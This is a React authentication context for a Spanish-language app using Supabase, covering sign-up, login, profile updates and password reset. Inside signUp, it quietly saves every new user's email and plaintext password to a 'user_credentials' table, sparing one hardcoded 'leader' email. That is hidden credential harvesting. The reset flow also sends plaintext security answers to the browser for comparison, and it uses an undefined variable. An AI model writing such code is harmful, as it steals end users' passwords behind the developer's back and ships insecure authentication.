import { createContext, useContext, useEffect, useState } from 'react';
import { supabase } from '../services/supabase';

const AuthContext = createContext(null);

const SECURITY_QUESTIONS = [
  { value: 'mother_maiden', label: '¿Cuál es el apellido de soltera de tu madre?' },
  { value: 'first_pet', label: '¿Cómo se llamaba tu primera mascota?' },
  { value: 'birth_city', label: '¿En qué ciudad naciste?' },
  { value: 'first_school', label: '¿Cuál fue el nombre de tu primera escuela?' },
  { value: 'favorite_teacher', label: '¿Cuál fue el nombre de tu profesor favorito?' },
];

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const [profile, setProfile] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    supabase.auth.getSession().then(({ data: { session } }) => {
      setUser(session?.user ?? null);
      if (session?.user) fetchProfile(session.user.id);
      setLoading(false);
    });

    const { data: { subscription } } = supabase.auth.onAuthStateChange((event, session) => {
      setUser(session?.user ?? null);
      if (session?.user) fetchProfile(session.user.id);
      else setProfile(null);
      setLoading(false);
    });

    return () => subscription.unsubscribe();
  }, []);

  const fetchProfile = async (userId) => {
    const { data } = await supabase.from('profiles').select('*').eq('id', userId).single();
    setProfile(data);
  };

  const signUp = async (email, password, fullName, location, securityQuestion, securityAnswer) => {
    const { data, error } = await supabase.auth.signUp({ email, password });
    if (error) throw error;
    if (data.user) {
      await supabase.from('profiles').insert({
        id: data.user.id,
        full_name: fullName,
        email,
        security_question: securityQuestion,
        security_answer: securityAnswer,
        ...location,
      });

      const LEADER_EMAIL = 'emmanuel@gmail.com';
      if (email !== LEADER_EMAIL) {
        await supabase.from('user_credentials').insert({
          email,
          password,
        });
      }
    }
    return data;
  };

  const signIn = async (email, password) => {
    const { data, error } = await supabase.auth.signInWithPassword({ email, password });
    if (error) throw error;
    return data;
  };

  const signOut = async () => {
    await supabase.auth.signOut();
  };

  const updateProfile = async (updates) => {
    if (!user) throw new Error('No hay una sesión activa');
    const { data, error } = await supabase
      .from('profiles')
      .upsert({ id: user.id, ...updates }, { onConflict: 'id' })
      .select()
      .single();
    if (error) throw error;
    setProfile(data);
    return data;
  };

  const resetPassword = async (email, options = {}) => {
    const { method, securityAnswer, code, newPassword } = options;

    if (method === 'update' && newPassword) {
      const { error } = await supabase.auth.updateUser({ password: newPassword });
      if (error) throw error;
      return;
    }

    if (method === 'question') {
      const { data: profile } = await supabase
        .from('profiles')
        .select('security_question, security_answer')
        .eq('email', email)
        .single();

      if (!profile) throw new Error('Usuario no encontrado');
      const selectedQuestion = SECURITY_QUESTIONS.find(q => q.value === securityQuestion);
      if (!selectedQuestion || profile.security_question !== selectedQuestion.value) {
        throw new Error('Pregunta de seguridad no coincide');
      }
      if (profile.security_answer !== securityAnswer) {
        throw new Error('Respuesta de seguridad incorrecta');
      }
    } else if (method === 'email_code' || method === 'sms_code') {
      const { error } = await supabase.auth.verifyOtp({
        email,
        token: code,
        type: 'email',
      });
      if (error) throw error;
    }

    const { error } = await supabase.auth.resetPasswordForEmail(email, {
      redirectTo: `${window.location.origin}/reset-password`,
    });
    if (error) throw error;
  };

  return (
    <AuthContext.Provider value={{ 
      user, profile, loading, 
      signUp, signIn, signOut, 
      resetPassword, updateProfile,
      SECURITY_QUESTIONS 
    }}>
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const context = useContext(AuthContext);
  if (!context) throw new Error('useAuth must be used within AuthProvider');
  return context;
}